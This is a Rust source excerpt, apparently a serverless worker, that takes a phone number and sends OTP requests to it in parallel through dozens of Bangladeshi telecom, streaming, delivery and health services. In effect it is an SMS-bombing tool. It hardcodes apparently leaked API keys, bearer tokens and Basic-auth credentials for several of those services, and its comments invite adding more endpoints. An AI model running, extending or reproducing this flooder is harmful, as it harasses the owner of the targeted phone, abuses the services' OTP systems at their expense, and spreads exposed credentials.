...
// ── Standard POST — JSON body, common headers ──
...
// ── POST with extra custom headers ──
async fn fire_h(name: &'static str, url: &'static str, payload: Value, extra: Vec<(&'static str, &'static str)>) -> Value {
    let mut init = RequestInit::new();
    init.with_method(Method::Post);
    let mut h = Headers::new();
    h.set("Content-Type",    "application/json").unwrap();
...
async fn fire_form(name: &'static str, url: &'static str, body: &'static str) -> Value {
    ...
    h.set("User-Agent",   "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36").unwrap();
    h.set("Accept",       "application/json, */*").unwrap();
    init.with_headers(h);
...
pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
    ...
    let mojaru_form: &'static str = Box::leak(format!("mobile_or_email={}&app_hash_key=hi&app_mode=RELEASE", number_str).into_boxed_str());
    let admissionprostuti_form: &'static str = Box::leak(format!("mobile={}", number_str).into_boxed_str());
    let shl_form: &'static str = Box::leak(format!("number={}", number_str).into_boxed_str());
    let acurebd_form: &'static str = Box::leak(format!("mobile={}&vtm=28%2F11%2F2023%2C%2022%3A21%3A39", number_str).into_boxed_str());
    let ecourier_url: &'static str = Box::leak(format!("https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={}", number_str).into_boxed_str());
    let pharmaid_url: &'static str = Box::leak(format!("https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber={}", number_str).into_boxed_str());
    let medeasy_url: &'static str  = Box::leak(format!("https://api.medeasy.health/api/send-otp/+88{}/", number_str).into_boxed_str());
    let robi_url: &'static str     = Box::leak(format!("https://scs.robi.com.bd/api/send-otp?mobile_no={}", number_str).into_boxed_str());
    let alg_url: &'static str      = Box::leak(format!("https://alglimited.com/api/v1/otp-sms-send/{}", number_str).into_boxed_str());
    let apon_url: &'static str     = Box::leak(format!("https://apon.ibos.io/apon/partner/Registration/OTPGenerate?PhoneNumber={}&Typeid=1", number_str).into_boxed_str());
    let china_url: &'static str    = Box::leak(format!("https://chinaonlinebd.com/api/login/getOtp?phone={}", number_str).into_boxed_str());
    let ip_url: &'static str       = Box::leak(format!("http://202.51.186.182:33262/api/v1/generate-otp?phone={}", number_str).into_boxed_str());
    let uzan_url: &'static str     = Box::leak(format!("https://www.uzanvati.com/user/otp?phone={}", number_str).into_boxed_str());
    let binge_url: &'static str    = Box::leak(format!("https://web-api.binge.buzz/api/v3/otp/send/+88{}", number_str).into_boxed_str());
    let gp_cin_url: &'static str   = Box::leak(format!("https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/88{}", bd_no).into_boxed_str());
    ...
    let api_results = parallel![
        ...
        fire("Hoichoi TV",      "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", json!({"phoneNumber": plus_bd, "requestType": "send", "whatsappConsent": false})),
        ...
        fire("Klassy BD 2",     "https://api.klassy.com.bd/api/v2/public/user/register/send/otp", json!({"phone": number})),
        fire("Shl BD",          "https://shl.com.bd/api/appapi/sendOTP",                     json!({"number": number})),

        // ── Special headers APIs ──
        fire_h("Munchies BD",   "https://api.munchies.com.bd/parse/functions/generateOtp",   json!({"phone": number}), vec![("x-parse-application-id", "food")]),
        fire_h("Relaxy XKey",   "https://dev.api.relaxy.com.bd/api/v1/otp/send",             json!({"phoneNumber": plus_bd, "appSignature": "appSignature"}), vec![("x-api-key", "6yjOGvakSbHjA64NGqo7m25TBC4WX8BauAXEP3dX")]),
        fire_h("QuizGiri",      "https://developer.quizgiri.xyz/api/v2.0/send-otp",          json!({"phone": bd_no, "country_code": "+880"}), vec![("x-api-key", "gYsiNSVBDuCt8yMUXpF06iQ1eDrMGv6G")]),
        fire_h("Shomvob Auth",  "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0", json!({"phone": bd_full}), vec![("Authorization", "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s")]),
        fire_h("Doctor Live",   "https://doctorlivebd.com/api/patient/auth/otpsend",         json!({"country_code": "880", "mobile": bd_no}), vec![]),
        fire_h("Hoichoi XKey",  "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", json!({"phoneNumber": plus_bd, "requestType": "send", "whatsappConsent": false}), vec![("x-api-key", "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef")]),
        fire_h("Babuland",      "http://apps.babuland.org/bblapi/apiv2/apiv5/bbl_api_user_otp", json!({}), vec![("mobileno", plus_bd), ("otpcode", "111135"), ("branchid", "6")]),
        fire_h("WafiLife",      "https://m-backend.wafilife.com/wp-json/wc/v2/send-otp",    json!({"p": bd_full}), vec![]),
        fire_h("Smart Ukil",    "https://smartukil.com/api/send-verification-code",          json!({"phone": number}), vec![("authorization", "ergjvbner234erv%^&hjb23QQ!FL*qpdjfweufhjvYUH%^&hj367^&*bedvhjb%^&RhjkbwerfIHVyIy!6XC3E")]),
        fire_h("Meyeghor",      "https://meyeghor.com/wp-json/digits/v1/send_otp",           json!({"countrycode": "+880", "mobileNo": number, "type": "register", "email": "dangerousboytushar@gmail.com"}), vec![("Authorization", "Basic Y2tfNzk3MzQ0NzljZWUxZTU2Y2M1MjBkODczOTkxZGRhYjE5ZTMwYzQyMzpjc18xMmE5ODFkODYzMmE1NDMyMzMzNmY0YWNmNWVkNjYxNmQzM2JkNTU2"), ("Timedifference", "360"), ("X-API-Version", "1.1")]),

        // ── Form-urlencoded APIs ──
        fire_form("Mojaru Form",   "https://new.mojaru.com/api/student/login-registration", mojaru_form),
        fire_form("AdmissionProstuti", "https://admissionprostuti.com/api/app/otp-sent?fromApp=true", admissionprostuti_form),
        fire_form("SHL Form",      "https://shl.com.bd/api/appapi/sendOTP",                shl_form),
        fire_form("Acure BD",      "https://acurebd.com/users/ajax_otpsms",                acurebd_form),

        // ── GET APIs ──
        fire_get("ECourier",       ecourier_url),
        fire_get("Pharmaid RX",    pharmaid_url),
        fire_get("Medeasy Health", medeasy_url),
        fire_get("Robi SCS",       robi_url),
        fire_get("ALG Limited",    alg_url),
        fire_get("Apon IBOS",      apon_url),
        fire_get("China Online BD",china_url),
        fire_get("IP API BD",      ip_url),
        fire_get("Uzanvati",       uzan_url),
        fire_get("Binge Buzz",     binge_url),
        fire_get("GP Cinematic",   gp_cin_url),

        // ── এখানে নতুন API যোগ করো ──
        // Standard JSON: fire("নাম", "https://url", json!({"phone": number})),
        // Extra headers: fire_h("নাম", "https://url", json!({"phone": number}), vec![("Header-Key", "value")]),
        // Form data:     fire_form("নাম", "https://url", Box::leak(format!("phone={}", number_str).into_boxed_str())),
        // GET request:   fire_get("নাম", Box::leak(format!("https://url?phone={}", number_str).into_boxed_str())),
    ];
